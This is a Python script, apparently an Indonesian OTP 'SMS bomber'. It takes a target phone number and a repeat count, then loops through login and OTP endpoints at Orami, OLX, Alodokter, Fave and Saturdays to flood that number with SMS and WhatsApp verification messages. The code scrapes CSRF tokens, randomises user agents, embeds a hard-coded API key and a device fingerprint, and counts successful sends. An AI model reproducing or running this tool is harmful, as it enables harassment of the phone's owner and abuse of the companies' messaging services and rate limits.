import requests
import json
import time
from fake_useragent import UserAgent
from bs4 import BeautifulSoup as bs
ua = UserAgent()


fav = 0
saturdey = 0
aldok = 0
olx = 0
orami = 0
nom = input("Nomor: ")
jumlah = int(input("Jumlah: "))
for i in range(jumlah):
    time.sleep(1)
    # Kebutuhan Tokem Aldokter

    res = requests.Session()
    res.headers.update(
        {'referer': 'https://www.alodokter.com/login-alodokter'})
    hy = res.get("https://www.alodokter.com/login-alodokter")
    tol = bs(hy.text, 'html.parser')
    token = tol.find('meta', {'name': 'csrf-token'})['content']

    # header data
    header_orami = {
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "id,en;q=0.9,id-ID;q=0.8",
        "content-length": "46",
        "content-type": "application/json",
        "origin": "https://passport.orami.co.id",
        "referer": "https://passport.orami.co.id/",
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "Android",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
    }
    header_saturdey = {"Accept": "*/*",
                       "Accept-Encoding": "gzip, deflate, br",
                       "Accept-Language": "id,en;q=0.9,id-ID;q=0.8",
                       "Authorization": "undefined",
                       "Connection": "keep-alive",
                       "Content-Length": "55",
                       "Content-Type": "application/json",
                       "Host": "beta.api.saturdays.com",
                       "Origin": "https://saturdays.com",
                       "platform": "mweb",
                       "Referer": "https://saturdays.com/",
                       "sec-ch-ua-mobile": "?0",
                       "sec-ch-ua-platform": "Windows",
                       "Sec-Fetch-Dest": "empty",
                       "Sec-Fetch-Mode": "cors",
                       "Sec-Fetch-Site": "same-site",
                       "User-Agent": ua.random,
                       "x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj", }
    hd_fav = {
        "Host": "api.myfave.com",
                "Connection": "keep-alive",
                "x-user-agent": "Fave-PWA/v1.0.0",
                "User-Agent": ua.random,
                "content-type": "application/json",
                "Accept": "*/*",
                "Origin": "https://m.myfave.com",
                "Referer": "https://m.myfave.com/jakarta/auth",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    hd_aldok = {
        'user-agent': ua.random,
        'content-type': 'application/json',
        'referer': 'https://www.alodokter.com/login-alodokter',
        'accept': 'application/json',
        'origin': 'https://www.alodokter.com',
        'x-csrf-token': token
    }
    headers_olx = {
        "accept": "*/*",
        "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
        "x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
        "user-agent": ua.random,
        "content-type": "application/json",
    }
    # requests data
    dat = {'phone': '62'+nom}
    data_saturdey = {"number": nom, "country_code": "+62", "type": ""}

    # post data to
    r1_orami = requests.Session().post(
        "https://passport-api.orami.co.id/api/otp/send/", headers=header_orami, data=json.dumps({"phone": "+62"+nom, "method": "whatsapp",
                                                                                                 "attempt_count": 1, "max_attempt": 3, "cooldown": 29})).text
    r_olx = requests.Session().post("https://www.olx.co.id/api/auth/authenticate",
                                    data=json.dumps({"grantType": "retry",
                                                     "method": "sms",
                                                     "phone": "+62"+nom,
                                                     "language": "id"}), headers=headers_olx).text
    r_aldok = res.post("https://www.alodokter.com/login-with-phone-number",
                       headers=hd_aldok, json={"user": {"phone": "0"+nom}}).text

    r = requests.post("https://api.myfave.com/api/fave/v3/auth",
                      data=json.dumps(dat), headers=hd_fav).text
    r1_saturdey = requests.Session().post(
        "https://beta.api.saturdays.com/api/v1/user/otp/send", headers=header_saturdey, data=json.dumps(data_saturdey)).text
    if "request_id" in r:
        fav += 1
    if "status" in r1_saturdey:
        saturdey += 1
    if "success" in r_aldok:
        aldok += 1
    if "PENDING" in r_olx:
        olx += 1
    if "phone" in r1_orami:
        orami += 1
    print(
        f"jumlah Fav/Saturdey/Aldok/Olx/Orami: {fav}/{saturdey}/{aldok}/{olx}/{orami}")
